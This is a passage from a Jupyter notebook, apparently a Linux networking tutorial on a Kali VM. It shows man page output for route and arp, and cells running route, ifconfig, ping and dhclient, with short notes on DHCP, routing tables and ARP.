      "       -\b-F\bF     operate on the kernel's FIB (Forwarding Information Base)  rout‐\r\n",
      "              ing table.  This is the default.\r\n",
      "\r\n",
      "       -\b-C\bC     operate on the kernel's routing cache.\r\n",
      "\r\n",
      "       -\b-v\bv     select verbose operation.\r\n",
      "\r\n",
      "       -\b-n\bn     show numerical addresses instead of trying to determine symbolic\r\n",
      "              host names. This is useful if you are trying  to  determine  why\r\n",
      "              the route to your nameserver has vanished.\r\n",
      "\r\n",
      "       -\b-e\be     use  n\bne\bet\bts\bst\bta\bat\bt(8)-format  for  displaying  the routing table.  -\b-e\bee\be\r\n",
      "              will generate a very long line  with  all  parameters  from  the\r\n",
      "              routing table.\r\n",
      "\r\n",
      "       d\bde\bel\bl    delete a route.\r\n",
      "\r\n",
      "       a\bad\bdd\bd    add a new route.\r\n",
      "\r\n",
      "       _\bt_\ba_\br_\bg_\be_\bt the destination network or host. You can provide an addresses or\r\n",
      "              symbolic network or host name. Optionally you can use /\b/_\bp_\br_\be_\bf_\bi_\bx_\bl_\be_\bn\r\n",
      "              notation instead of using the n\bne\bet\btm\bma\bas\bsk\bk option.\r\n",
      "\r\n",
      "       -\b-n\bne\bet\bt   the _\bt_\ba_\br_\bg_\be_\bt is a network.\r\n",
      "\r\n",
      "       -\b-h\bho\bos\bst\bt  the _\bt_\ba_\br_\bg_\be_\bt is a host.\r\n",
      "\r\n",
      "       n\bne\bet\btm\bma\bas\bsk\bk _\bN_\bM\r\n",
      "              when adding a network route, the netmask to be used.\r\n",
      "\r\n",
      "       g\bgw\bw _\bG_\bW  route packets via a gateway.\r\n",
      "              N\bNO\bOT\bTE\bE:\b:  The  specified gateway must be reachable first. This usu‐\r\n",
      "              ally means that you have to set up a static route to the gateway\r\n",
      "              beforehand.  If you specify the address of one of your local in‐\r\n",
      "              terfaces, it will be used to decide about the interface to which\r\n",
      "              the  packets should be routed to. This is a BSDism compatibility\r\n",
      "              hack.\r\n",
      "\r\n",
      "       m\bme\bet\btr\bri\bic\bc _\bM\r\n",
      "              set the metric field in the routing table (used by routing  dae‐\r\n",
      "              mons) to _\bM. If this option is not specified the metric for inet6\r\n",
      "              (IPv6) address family defaults to '1', for inet  (IPv4)  it  de‐\r\n",
      "              faults  to  '0'.  You  should  always specify an explicit metric\r\n",
      "              value to not rely on those defaults  -  they  also  differ  from\r\n",
      "              iproute2.\r\n",
      "\r\n",
      "       m\bms\bss\bs _\bM  sets  MTU  (Maximum  Transmission Unit) of the route to _\bM bytes.\r\n",
      "              Note that the current implementation of the route  command  does\r\n",
      "              not allow the option to set the Maximum Segment Size (MSS).\r\n",
      "\r\n",
      "       w\bwi\bin\bnd\bdo\bow\bw _\bW\r\n",
      "              set  the  TCP  window  size for connections over this route to _\bW\r\n",
      "              bytes. This is typically only used on AX.25  networks  and  with\r\n",
      "              drivers unable to handle back to back frames.\r\n",
      "\r\n",
      "       i\bir\brt\btt\bt _\bI set  the initial round trip time (irtt) for TCP connections over\r\n",
      "              this route to _\bI milliseconds (1-12000). This is  typically  only\r\n",
      "              used on AX.25 networks. If omitted the RFC 1122 default of 300ms\r\n",
      "              is used.\r\n",
      "\r\n",
      "       r\bre\bej\bje\bec\bct\bt install a blocking route, which will force  a  route  lookup  to\r\n",
      "              fail.   This is for example used to mask out networks before us‐\r\n",
      "              ing the default route. This is NOT for firewalling.\r\n",
      "\r\n",
      "       m\bmo\bod\bd,\b, d\bdy\byn\bn,\b, r\bre\bei\bin\bns\bst\bta\bat\bte\be\r\n",
      "              install a dynamic or modified route. These flags are  for  diag‐\r\n",
      "              nostic purposes, and are generally only set by routing daemons.\r\n",
      "\r\n",
      "       d\bde\bev\bv _\bI_\bf force  the  route to be associated with the specified device, as\r\n",
      "              the kernel will otherwise try to determine the device on its own\r\n",
      "              (by  checking already existing routes and device specifications,\r\n",
      "              and where the route is added to). In most  normal  networks  you\r\n",
      "              won't need this.\r\n",
      "\r\n",
      "              If  d\bde\bev\bv  _\bI_\bf is the last option on the command line, the word d\bde\bev\bv\r\n",
      "              may be omitted, as it's the default. Otherwise the order of  the\r\n",
      "              route modifiers (m\bme\bet\btr\bri\bic\bc n\bne\bet\btm\bma\bas\bsk\bk g\bgw\bw d\bde\bev\bv) doesn't matter.\r\n",
      "\r\n",
      "E\bEX\bXA\bAM\bMP\bPL\bLE\bES\bS\r\n",
      "       r\bro\bou\but\bte\be a\bad\bdd\bd -\b-n\bne\bet\bt 1\b12\b27\b7.\b.0\b0.\b.0\b0.\b.0\b0 n\bne\bet\btm\bma\bas\bsk\bk 2\b25\b55\b5.\b.0\b0.\b.0\b0.\b.0\b0 m\bme\bet\btr\bri\bic\bc 1\b10\b02\b24\b4 d\bde\bev\bv l\blo\bo\r\n",
      "              adds  the normal loopback entry, using netmask 255.0.0.0 and as‐\r\n",
      "              sociated with the \"lo\" device (assuming this device  was  previ‐\r\n",
      "              ously set up correctly with i\bif\bfc\bco\bon\bnf\bfi\big\bg(8)).\r\n",
      "\r\n",
      "       r\bro\bou\but\bte\be a\bad\bdd\bd -\b-n\bne\bet\bt 1\b19\b92\b2.\b.5\b56\b6.\b.7\b76\b6.\b.0\b0 n\bne\bet\btm\bma\bas\bsk\bk 2\b25\b55\b5.\b.2\b25\b55\b5.\b.2\b25\b55\b5.\b.0\b0 m\bme\bet\btr\bri\bic\bc 1\b10\b02\b24\b4 d\bde\bev\bv e\bet\bth\bh0\b0\r\n",
      "              adds  a  route to the local network 192.56.76.x via \"eth0\".  The\r\n",
      "              word \"dev\" can be omitted here.\r\n",
      "\r\n",
      "       r\bro\bou\but\bte\be d\bde\bel\bl d\bde\bef\bfa\bau\bul\blt\bt\r\n",
      "              deletes the current default route, which is labeled \"default\" or\r\n",
      "              0.0.0.0 in the destination field of the current routing table.\r\n",
      "\r\n",
      "       r\bro\bou\but\bte\be d\bde\bel\bl -\b-n\bne\bet\bt 1\b19\b92\b2.\b.5\b56\b6.\b.7\b76\b6.\b.0\b0 n\bne\bet\btm\bma\bas\bsk\bk 2\b25\b55\b5.\b.2\b25\b55\b5.\b.2\b25\b55\b5.\b.0\b0\r\n",
      "              deletes the route. Since the Linux routing kernel uses classless\r\n",
      "              addressing, you pretty much always have to specify  the  netmask\r\n",
      "              that is same as as seen in 'route -n' listing.\r\n",
      "\r\n",
      "       r\bro\bou\but\bte\be a\bad\bdd\bd d\bde\bef\bfa\bau\bul\blt\bt g\bgw\bw m\bma\ban\bng\bgo\bo\r\n",
      "              adds  a  default  route  (which  will  be used if no other route\r\n",
      "              matches).  All  packets  using  this  route  will  be  gatewayed\r\n",
      "              through  the  address  of a node named \"mango\". The device which\r\n",
      "              will actually be used for that route depends on how we can reach\r\n",
      "              \"mango\" - \"mango\" must be on directly reachable route.\r\n",
      "\r\n",
      "       r\bro\bou\but\bte\be a\bad\bdd\bd m\bma\ban\bng\bgo\bo s\bsl\bl0\b0\r\n",
      "              Adds  the route to the host named \"mango\" via the SLIP interface\r\n",
      "              (assuming that \"mango\" is the SLIP host).\r\n",
      "\r\n",
      "       r\bro\bou\but\bte\be a\bad\bdd\bd -\b-n\bne\bet\bt 1\b19\b92\b2.\b.5\b57\b7.\b.6\b66\b6.\b.0\b0 n\bne\bet\btm\bma\bas\bsk\bk 2\b25\b55\b5.\b.2\b25\b55\b5.\b.2\b25\b55\b5.\b.0\b0 g\bgw\bw m\bma\ban\bng\bgo\bo\r\n",
      "              This command adds the net \"192.57.66.x\" to be gatewayed  through\r\n",
      "              the former route to the SLIP interface.\r\n",
      "\r\n",
      "       r\bro\bou\but\bte\be a\bad\bdd\bd -\b-n\bne\bet\bt 2\b22\b24\b4.\b.0\b0.\b.0\b0.\b.0\b0 n\bne\bet\btm\bma\bas\bsk\bk 2\b24\b40\b0.\b.0\b0.\b.0\b0.\b.0\b0 d\bde\bev\bv e\bet\bth\bh0\b0\r\n",
      "              This  is  an obscure one documented so people know how to do it.\r\n",
      "              This sets all of the class D (multicast) IP  routes  to  go  via\r\n",
      "              \"eth0\".  This  is  the  correct normal configuration line with a\r\n",
      "              multicasting kernel.\r\n",
      "\r\n",
      "       r\bro\bou\but\bte\be a\bad\bdd\bd -\b-n\bne\bet\bt 1\b10\b0.\b.0\b0.\b.0\b0.\b.0\b0 n\bne\bet\btm\bma\bas\bsk\bk 2\b25\b55\b5.\b.0\b0.\b.0\b0.\b.0\b0 m\bme\bet\btr\bri\bic\bc 1\b10\b02\b24\b4 r\bre\bej\bje\bec\bct\bt\r\n",
      "              This  installs  a  rejecting  route  for  the  private   network\r\n",
      "              \"10.x.x.x.\"\r\n",
      "\r\n",
      "       r\bro\bou\but\bte\be -\b-6\b6 a\bad\bdd\bd 2\b20\b00\b01\b1:\b:0\b00\b00\b02\b2:\b::\b:/\b/4\b48\b8 m\bme\bet\btr\bri\bic\bc 1\b1 d\bde\bev\bv e\bet\bth\bh0\b0\r\n",
      "              This  adds a IPv6 route with the specified metric to be directly\r\n",
      "              reachable via eth0.\r\n",
      "\r\n",
      "O\bOU\bUT\bTP\bPU\bUT\bT\r\n",
      "       The output of the kernel routing table is organized  in  the  following\r\n",
      "       columns\r\n",
      "\r\n",
      "       D\bDe\bes\bst\bti\bin\bna\bat\bti\bio\bon\bn\r\n",
      "              The destination network or destination host.\r\n",
      "\r\n",
      "       G\bGa\bat\bte\bew\bwa\bay\by\r\n",
      "              The gateway address or '*' if none set.\r\n",
      "\r\n",
      "       G\bGe\ben\bnm\bma\bas\bsk\bk\r\n",
      "              The  netmask  for  the  destination net; '255.255.255.255' for a\r\n",
      "              host destination and '0.0.0.0' for the d\bde\bef\bfa\bau\bul\blt\bt route.\r\n",
      "\r\n",
      "       F\bFl\bla\bag\bgs\bs  Possible flags include\r\n",
      "              U\bU (route is u\bup\bp)\r\n",
      "              H\bH (target is a h\bho\bos\bst\bt)\r\n",
      "              G\bG (use g\bga\bat\bte\bew\bwa\bay\by)\r\n",
      "              R\bR (r\bre\bei\bin\bns\bst\bta\bat\bte\be route for dynamic routing)\r\n",
      "              D\bD (d\bdy\byn\bna\bam\bmi\bic\bca\bal\bll\bly\by installed by daemon or redirect)\r\n",
      "              M\bM (m\bmo\bod\bdi\bif\bfi\bie\bed\bd from routing daemon or redirect)\r\n",
      "              A\bA (installed by a\bad\bdd\bdr\brc\bco\bon\bnf\bf)\r\n",
      "              C\bC (c\bca\bac\bch\bhe\be entry)\r\n",
      "              !\b!  (r\bre\bej\bje\bec\bct\bt route)\r\n",
      "\r\n",
      "       M\bMe\bet\btr\bri\bic\bc The 'distance' to the target (usually counted in hops).\r\n",
      "\r\n",
      "       R\bRe\bef\bf    Number of references to this route. (Not used in the Linux  ker‐\r\n",
      "              nel.)\r\n",
      "\r\n",
      "       U\bUs\bse\be    Count  of lookups for the route.  Depending on the use of -F and\r\n",
      "              -C this will be either route cache misses (-F) or hits (-C).\r\n",
      "\r\n",
      "       I\bIf\bfa\bac\bce\be  Interface to which packets for this route will be sent.\r\n",
      "\r\n",
      "       M\bMS\bSS\bS    Default maximum segment  size  for  TCP  connections  over  this\r\n",
      "              route.\r\n",
      "\r\n",
      "       W\bWi\bin\bnd\bdo\bow\bw Default window size for TCP connections over this route.\r\n",
      "\r\n",
      "       i\bir\brt\btt\bt   Initial  RTT  (Round  Trip  Time). The kernel uses this to guess\r\n",
      "              about the best TCP protocol parameters without waiting on  (pos‐\r\n",
      "              sibly slow) answers.\r\n",
      "\r\n",
      "       H\bHH\bH (\b(c\bca\bac\bch\bhe\bed\bd o\bon\bnl\bly\by)\b)\r\n",
      "              The  number  of  ARP entries and cached routes that refer to the\r\n",
      "              hardware header cache for the cached route. This will be -1 if a\r\n",
      "              hardware  address  is not needed for the interface of the cached\r\n",
      "              route (e.g. lo).\r\n",
      "\r\n",
      "       A\bAr\brp\bp (\b(c\bca\bac\bch\bhe\bed\bd o\bon\bnl\bly\by)\b)\r\n",
      "              Whether or not the hardware address for the cached route  is  up\r\n",
      "              to date.\r\n",
      "\r\n",
      "F\bFI\bIL\bLE\bES\bS\r\n",
      "       _\b/_\bp_\br_\bo_\bc_\b/_\bn_\be_\bt_\b/_\bi_\bp_\bv_\b6_\b__\br_\bo_\bu_\bt_\be\r\n",
      "       _\b/_\bp_\br_\bo_\bc_\b/_\bn_\be_\bt_\b/_\br_\bo_\bu_\bt_\be\r\n",
      "       _\b/_\bp_\br_\bo_\bc_\b/_\bn_\be_\bt_\b/_\br_\bt_\b__\bc_\ba_\bc_\bh_\be\r\n",
      "\r\n",
      "S\bSE\bEE\bE A\bAL\bLS\bSO\bO\r\n",
      "       _\bi_\bf_\bc_\bo_\bn_\bf_\bi_\bg(8), _\bn_\be_\bt_\bs_\bt_\ba_\bt(8), _\ba_\br_\bp(8), _\br_\ba_\br_\bp(8), _\bi_\bp(8)\r\n",
      "\r\n",
      "H\bHI\bIS\bST\bTO\bOR\bRY\bY\r\n",
      "       R\bRo\bou\but\bte\be  for  Linux  was  originally  written  by  Fred  N.   van Kempen,\r\n",
      "       <waltje@uwalt.nl.mugnet.org> and then modified by Johannes  Stille  and\r\n",
      "       Linus  Torvalds for pl15. Alan Cox added the mss and window options for\r\n",
      "       Linux 1.1.22. irtt support and merged with netstat  from  Bernd  Ecken‐\r\n",
      "       fels.\r\n",
      "\r\n",
      "A\bAU\bUT\bTH\bHO\bOR\bR\r\n",
      "       Currently  maintained  by Phil Blundell <Philip.Blundell@pobox.com> and\r\n",
      "       Bernd Eckenfels <net-tools@lina.inka.de>.\r\n",
      "\r\n",
      "net-tools                         2014-02-17                          ROUTE(8)\r\n"
     ]
    }
   ],
   "source": [
    "! man route"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: Kernel IP routing table\r\n",
      "Destination     Gateway         Genmask         Flags Metric Ref    Use Iface\r\n",
      "0.0.0.0         192.168.195.2   0.0.0.0         UG    0      0        0 eth0\r\n",
      "192.168.195.0   0.0.0.0         255.255.255.0   U     0      0        0 eth0\r\n"
     ]
    }
   ],
   "source": [
    "# route is priviledge command\n",
    "! echo kali | sudo -S route -n # show numerical addresses"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: eth0: flags=4419<UP,BROADCAST,RUNNING,PROMISC,MULTICAST>  mtu 1500\r\n",
      "        inet6 fe80::20c:29ff:febb:4e8a  prefixlen 64  scopeid 0x20<link>\r\n",
      "        ether 00:0c:29:bb:4e:8a  txqueuelen 1000  (Ethernet)\r\n",
      "        RX packets 30555  bytes 27297659 (26.0 MiB)\r\n",
      "        RX errors 0  dropped 0  overruns 0  frame 0\r\n",
      "        TX packets 13345  bytes 1875010 (1.7 MiB)\r\n",
      "        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\r\n",
      "\r\n",
      "lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\r\n",
      "        inet 127.0.0.1  netmask 255.0.0.0\r\n",
      "        inet6 ::1  prefixlen 128  scopeid 0x10<host>\r\n",
      "        loop  txqueuelen 1000  (Local Loopback)\r\n",
      "        RX packets 49376  bytes 43653244 (41.6 MiB)\r\n",
      "        RX errors 0  dropped 0  overruns 0  frame 0\r\n",
      "        TX packets 49376  bytes 43653244 (41.6 MiB)\r\n",
      "        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S ifconfig"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PING 192.168.195.131 (192.168.195.131) 56(84) bytes of data.\n",
      "64 bytes from 192.168.195.131: icmp_seq=1 ttl=64 time=0.835 ms\n",
      "64 bytes from 192.168.195.131: icmp_seq=2 ttl=64 time=0.460 ms\n",
      "64 bytes from 192.168.195.131: icmp_seq=3 ttl=64 time=1.25 ms\n",
      "64 bytes from 192.168.195.131: icmp_seq=4 ttl=64 time=0.768 ms\n",
      "64 bytes from 192.168.195.131: icmp_seq=5 ttl=64 time=1.13 ms\n",
      "64 bytes from 192.168.195.131: icmp_seq=6 ttl=64 time=0.576 ms\n",
      "64 bytes from 192.168.195.131: icmp_seq=7 ttl=64 time=0.630 ms\n",
      "64 bytes from 192.168.195.131: icmp_seq=8 ttl=64 time=0.383 ms\n",
      "^C\n",
      "\n",
      "--- 192.168.195.131 ping statistics ---\n",
      "8 packets transmitted, 8 received, 0% packet loss, time 7111ms\n",
      "rtt min/avg/max/mdev = 0.383/0.753/1.250/0.288 ms\n"
     ]
    }
   ],
   "source": [
    "! ping 192.168.195.131"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PING 192.168.195.2 (192.168.195.2) 56(84) bytes of data.\n",
      "64 bytes from 192.168.195.2: icmp_seq=1 ttl=128 time=0.302 ms\n",
      "64 bytes from 192.168.195.2: icmp_seq=2 ttl=128 time=0.478 ms\n",
      "64 bytes from 192.168.195.2: icmp_seq=3 ttl=128 time=0.171 ms\n",
      "64 bytes from 192.168.195.2: icmp_seq=4 ttl=128 time=0.147 ms\n",
      "64 bytes from 192.168.195.2: icmp_seq=5 ttl=128 time=0.228 ms\n",
      "64 bytes from 192.168.195.2: icmp_seq=6 ttl=128 time=0.179 ms\n",
      "64 bytes from 192.168.195.2: icmp_seq=7 ttl=128 time=0.099 ms\n",
      "64 bytes from 192.168.195.2: icmp_seq=8 ttl=128 time=0.193 ms\n",
      "64 bytes from 192.168.195.2: icmp_seq=9 ttl=128 time=0.343 ms\n",
      "64 bytes from 192.168.195.2: icmp_seq=10 ttl=128 time=0.298 ms\n",
      "^C\n",
      "\n",
      "--- 192.168.195.2 ping statistics ---\n",
      "10 packets transmitted, 10 received, 0% packet loss, time 9223ms\n",
      "rtt min/avg/max/mdev = 0.099/0.243/0.478/0.106 ms\n"
     ]
    }
   ],
   "source": [
    "! ping 192.168.195.2\n",
    "# will not stop; so click Kernel -> Interrept to send Ctrl+C to the Terminal"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## dhclient\n",
    " - Dynamic Host Configuration Prototocol Client\n",
    " - used to configure network interfaces with DHCP\n",
    "     - IP addresses are assigned dynamically\n",
    "     - if fails, IP can be assigned statically"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! man dhclient"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: Killed old client process\n",
      "Internet Systems Consortium DHCP Client 4.4.1\n",
      "Copyright 2004-2018 Internet Systems Consortium.\n",
      "All rights reserved.\n",
      "For info, please visit https://www.isc.org/software/dhcp/\n",
      "\n",
      "Corrupt lease file - possible data loss!\n",
      "Corrupt lease file - possible data loss!\n",
      "Listening on LPF/eth0/00:0c:29:bb:4e:8a\n",
      "Sending on   LPF/eth0/00:0c:29:bb:4e:8a\n",
      "Sending on   Socket/fallback\n",
      "DHCPRELEASE of 192.168.195.157 on eth0 to 192.168.195.254 port 67\n"
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S dhclient -v -r"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Internal routing table\n",
    "- typically displays gateway information that could be very useful to know how the packet is being routed to the internet"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: \n",
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "! sudo kali | sudo -S dhclient"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! route -n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: eth0: flags=4419<UP,BROADCAST,RUNNING,PROMISC,MULTICAST>  mtu 1500\r\n",
      "        inet 192.168.195.157  netmask 255.255.255.0  broadcast 192.168.195.255\r\n",
      "        inet6 fe80::20c:29ff:febb:4e8a  prefixlen 64  scopeid 0x20<link>\r\n",
      "        ether 00:0c:29:bb:4e:8a  txqueuelen 1000  (Ethernet)\r\n",
      "        RX packets 30673  bytes 27327718 (26.0 MiB)\r\n",
      "        RX errors 0  dropped 0  overruns 0  frame 0\r\n",
      "        TX packets 13365  bytes 1878123 (1.7 MiB)\r\n",
      "        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\r\n",
      "\r\n",
      "lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\r\n",
      "        inet 127.0.0.1  netmask 255.0.0.0\r\n",
      "        inet6 ::1  prefixlen 128  scopeid 0x10<host>\r\n",
      "        loop  txqueuelen 1000  (Local Loopback)\r\n",
      "        RX packets 49584  bytes 43803434 (41.7 MiB)\r\n",
      "        RX errors 0  dropped 0  overruns 0  frame 0\r\n",
      "        TX packets 49584  bytes 43803434 (41.7 MiB)\r\n",
      "        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S ifconfig"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ARP - address resolution protocol \n",
    "- maps private IP to ethernet/MAC address for local/internal routing\n",
    "- without knowing each other's MAC address, systems cann't communicate each other\n",
    "- there are 4 different types of ARP messages, but ARP request and ARP reply message are most important and common types"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ARP(8)                Linux System Administrator's Manual               ARP(8)\r\n",
      "\r\n",
      "N\bNA\bAM\bME\bE\r\n",
      "       arp - manipulate the system ARP cache\r\n",
      "\r\n",
      "S\bSY\bYN\bNO\bOP\bPS\bSI\bIS\bS\r\n",
      "       a\bar\brp\bp [-\b-v\bvn\bn] [-\b-H\bH _\bt_\by_\bp_\be] [-\b-i\bi _\bi_\bf] [-\b-a\bae\be] [_\bh_\bo_\bs_\bt_\bn_\ba_\bm_\be]\r\n",
      "\r\n",
      "       a\bar\brp\bp [-\b-v\bv] [-\b-i\bi _\bi_\bf] -\b-d\bd _\bh_\bo_\bs_\bt_\bn_\ba_\bm_\be [p\bpu\bub\bb]\r\n",
      "\r\n",
      "       a\bar\brp\bp [-\b-v\bv] [-\b-H\bH _\bt_\by_\bp_\be] [-\b-i\bi _\bi_\bf] -\b-s\bs _\bh_\bo_\bs_\bt_\bn_\ba_\bm_\be _\bh_\bw_\b__\ba_\bd_\bd_\br [t\bte\bem\bmp\bp]\r\n",
      "\r\n",
      "       a\bar\brp\bp [-\b-v\bv] [-\b-H\bH _\bt_\by_\bp_\be] [-\b-i\bi _\bi_\bf] -\b-s\bs _\bh_\bo_\bs_\bt_\bn_\ba_\bm_\be _\bh_\bw_\b__\ba_\bd_\bd_\br [n\bne\bet\btm\bma\bas\bsk\bk _\bn_\bm] p\bpu\bub\bb\r\n",
      "\r\n",
      "       a\bar\brp\bp [-\b-v\bv] [-\b-H\bH _\bt_\by_\bp_\be] [-\b-i\bi _\bi_\bf] -\b-D\bDs\bs _\bh_\bo_\bs_\bt_\bn_\ba_\bm_\be _\bi_\bf_\bn_\ba_\bm_\be [n\bne\bet\btm\bma\bas\bsk\bk _\bn_\bm] p\bpu\bub\bb\r\n",
      "\r\n",
      "       a\bar\brp\bp [-\b-v\bvn\bnD\bD] [-\b-H\bH _\bt_\by_\bp_\be] [-\b-i\bi _\bi_\bf] -\b-f\bf [_\bf_\bi_\bl_\be_\bn_\ba_\bm_\be]\r\n",
      "\r\n",
      "D\bDE\bES\bSC\bCR\bRI\bIP\bPT\bTI\bIO\bON\bN\r\n",
      "       A\bAr\brp\bp  manipulates or displays the kernel's IPv4 network neighbour cache.\r\n",
      "       It can add entries to the table, delete one or display the current con‐\r\n",
      "       tent.\r\n",
      "\r\n",
      "       A\bAR\bRP\bP  stands  for Address Resolution Protocol, which is used to find the\r\n",
      "       media access control address of a network neighbour for  a  given  IPv4\r\n",
      "       Address.\r\n",
      "\r\n",
      "M\bMO\bOD\bDE\bES\bS\r\n",
      "       a\bar\brp\bp with no mode specifier will print the current content of the table.\r\n",
      "       It is possible to limit the number of entries printed, by specifying an\r\n",
      "       hardware address type, interface name or host address.\r\n",
      "\r\n",
      "       a\bar\brp\bp  -\b-d\bd  _\ba_\bd_\bd_\br_\be_\bs_\bs will delete a ARP table entry. Root or netadmin privi‐\r\n",
      "       lege is required to do this. The entry is found by  IP  address.  If  a\r\n",
      "       hostname  is  given, it will be resolved before looking up the entry in\r\n",
      "       the ARP table.\r\n",
      "\r\n",
      "       a\bar\brp\bp -\b-s\bs _\ba_\bd_\bd_\br_\be_\bs_\bs _\bh_\bw_\b__\ba_\bd_\bd_\br is used to set up a new table entry. The  format\r\n",
      "       of  the  _\bh_\bw_\b__\ba_\bd_\bd_\br  parameter is dependent on the hardware class, but for\r\n",
      "       most classes one can assume that the usual presentation  can  be  used.\r\n",
      "       For  the  Ethernet  class, this is 6 bytes in hexadecimal, separated by\r\n",
      "       colons. When adding proxy arp entries (that is those with  the  p\bpu\bub\bblish\r\n",
      "       flag  set)  a n\bne\bet\btm\bma\bas\bsk\bk may be specified to proxy arp for entire subnets.\r\n",
      "       This is not good practice, but is supported by older kernels because it\r\n",
      "       can  be useful. If the t\bte\bem\bmp\bp flag is not supplied entries will be perma‐\r\n",
      "       nent stored into the ARP cache. To simplify setting up entries for  one\r\n",
      "       of  your own network interfaces, you can use the a\bar\brp\bp -\b-D\bDs\bs _\ba_\bd_\bd_\br_\be_\bs_\bs _\bi_\bf_\bn_\ba_\bm_\be\r\n",
      "       form. In that case the hardware address is  taken  from  the  interface\r\n",
      "       with the specified name.\r\n",
      "\r\n",
      "O\bOP\bPT\bTI\bIO\bON\bNS\bS\r\n",
      "       -\b-v\bv,\b, -\b--\b-v\bve\ber\brb\bbo\bos\bse\be\r\n",
      "              Tell the user what is going on by being verbose.\r\n",
      "\r\n",
      "       -\b-n\bn,\b, -\b--\b-n\bnu\bum\bme\ber\bri\bic\bc\r\n",
      "              shows  numerical  addresses  instead of trying to determine sym‐\r\n",
      "              bolic host, port or user names.\r\n",
      "\r\n",
      "       -\b-H\bH _\bt_\by_\bp_\be, -\b--\b-h\bhw\bw-\b-t\bty\byp\bpe\be _\bt_\by_\bp_\be, -\b-t\bt _\bt_\by_\bp_\be\r\n",
      "              When setting or reading the ARP cache, this  optional  parameter\r\n",
      "              tells  a\bar\brp\bp  which class of entries it should check for.  The de‐\r\n",
      "              fault value of this parameter is e\bet\bth\bhe\ber\br (i.e. hardware code  0x01\r\n",
      "              for  IEEE  802.3  10Mbps  Ethernet).  Other values might include\r\n",
      "              network technologies such as ARCnet (a\bar\brc\bcn\bne\bet\bt) , PROnet (p\bpr\bro\bon\bne\bet\bt) ,\r\n",
      "              AX.25 (a\bax\bx2\b25\b5) and NET/ROM (n\bne\bet\btr\bro\bom\bm).\r\n",
      "\r\n",
      "       -\b-a\ba     Use alternate BSD style output format (with no fixed columns).\r\n",
      "\r\n",
      "       -\b-e\be     Use default Linux style output format (with fixed columns).\r\n",
      "\r\n",
      "       -\b-D\bD,\b, -\b--\b-u\bus\bse\be-\b-d\bde\bev\bvi\bic\bce\be\r\n",
      "              Instead  of  a hw_addr, the given argument is the name of an in‐\r\n",
      "              terface.  a\bar\brp\bp will use the MAC address of that interface for the\r\n",
      "              table  entry.  This is usually the best option to set up a proxy\r\n",
      "              ARP entry to yourself.\r\n",
      "\r\n",
      "       -\b-i\bi _\bI_\bf, -\b--\b-d\bde\bev\bvi\bic\bce\be _\bI_\bf\r\n",
      "              Select an interface. When dumping the  ARP  cache  only  entries\r\n",
      "              matching the specified interface will be printed. When setting a\r\n",
      "              permanent or t\bte\bem\bmp\bp ARP entry this interface  will  be  associated\r\n",
      "              with  the  entry;  if  this  option is not used, the kernel will\r\n",
      "              guess based on the routing table. For p\bpu\bub\bb entries the  specified\r\n",
      "              interface  is  the  interface  on which ARP requests will be an‐\r\n",
      "              swered.\r\n",
      "              N\bNO\bOT\bTE\bE:\b: This has to be different from the interface to  which  the\r\n",
      "              IP  datagrams will be routed.  N\bNO\bOT\bTE\bE:\b: As of kernel 2.2.0 it is no\r\n",
      "              longer possible to set an ARP entry for an entire subnet.  Linux\r\n",
      "              instead  does  automagic proxy arp when a route exists and it is\r\n",
      "              forwarding. See a\bar\brp\bp(7) for  details.  Also  the  d\bdo\bon\bnt\btp\bpu\bub\bb  option\r\n",
      "              which  is available for delete and set operations cannot be used\r\n",
      "              with 2.4 and newer kernels.\r\n",
      "\r\n",
      "       -\b-f\bf _\bf_\bi_\bl_\be_\bn_\ba_\bm_\be, -\b--\b-f\bfi\bil\ble\be _\bf_\bi_\bl_\be_\bn_\ba_\bm_\be\r\n",
      "              Similar to the -\b-s\bs option, only this time  the  address  info  is\r\n",
      "              taken from file _\bf_\bi_\bl_\be_\bn_\ba_\bm_\be.  This can be used if ARP entries for a\r\n",
      "              lot of hosts have to be set up.  The name of the  data  file  is\r\n",
      "              very often _\b/_\be_\bt_\bc_\b/_\be_\bt_\bh_\be_\br_\bs, but this is not official. If no filename\r\n",
      "              is specified _\b/_\be_\bt_\bc_\b/_\be_\bt_\bh_\be_\br_\bs is used as default.\r\n",
